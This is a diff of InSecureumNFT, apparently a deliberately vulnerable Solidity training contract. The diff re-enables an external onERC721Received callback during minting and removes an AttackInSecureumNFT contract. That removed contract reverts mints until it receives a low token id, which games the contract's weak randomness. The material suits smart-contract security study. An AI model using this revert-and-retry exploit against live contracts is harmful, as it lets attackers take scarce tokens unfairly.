@@ -1,5 +1,6 @@
 pragma solidity 0.8.7;
 import "hardhat/console.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 interface ERC721TokenReceiver {
     function onERC721Received(
@@ -29,8 +30,6 @@ contract InSecureumNFT {
     uint256 internal nonce = 0;
     uint256[TOKEN_LIMIT] internal indices;
 
-    ERC721TokenReceiver eRC721TokenReceiver;
-
     constructor(address payable _beneficiary) {
         deployer = payable(msg.sender);
         beneficiary = _beneficiary;
@@ -46,11 +45,9 @@ contract InSecureumNFT {
         publicSale = true;
     }
 
-    function isContract(address _addr)
-        internal
-        view
-        returns (bool addressCheck)
-    {
+    function isContract(
+        address _addr
+    ) internal view returns (bool addressCheck) {
         uint256 size;
         assembly {
             size := extcodesize(_addr)
@@ -123,13 +120,13 @@ contract InSecureumNFT {
 
         if (isContract(_to)) {
             /* FOR TESTING ONLY */
-            bytes4 retval = MAGIC_ERC721_RECEIVED;
-            // bytes4 retval = ERC721TokenReceiver(_to).onERC721Received(
-            //     msg.sender,
-            //     address(0),
-            //     id,
-            //     ""
-            // );
+            //bytes4 retval = MAGIC_ERC721_RECEIVED;
+            bytes4 retval = ERC721TokenReceiver(_to).onERC721Received(
+                msg.sender,
+                address(0),
+                id,
+                ""
+            );
 
             require(retval == MAGIC_ERC721_RECEIVED);
         }
@@ -148,38 +145,3 @@ contract InSecureumNFT {
 }
 
 error InsufficientId(uint256 id);
-
-contract AttackInSecureumNFT {
-    InSecureumNFT inSecureumNFT;
-
-    mapping(uint256 => bool) private ids;
-    event Mint(uint256 indexed id);
-
-    constructor(address _inSecureumNFT) {
-        inSecureumNFT = InSecureumNFT(_inSecureumNFT);
-    }
-
-    fallback() external payable {}
-
-    receive() external payable {}
-
-    function exploitMint() external payable returns (uint256) {
-        uint256 id = inSecureumNFT.mint{value: 1 ether}();
-        emit Mint(id);
-        ids[id] = true;
-        if (id > 5) {
-            revert InsufficientId(id);
-        }
-
-        return id;
-    }
-
-    function isIdMinted(uint256 id) external view returns (bool) {
-        if (ids[id]) {
-            return true;
-        }
-        return false;
-    }
-
-    function deposit() external payable {}
-}
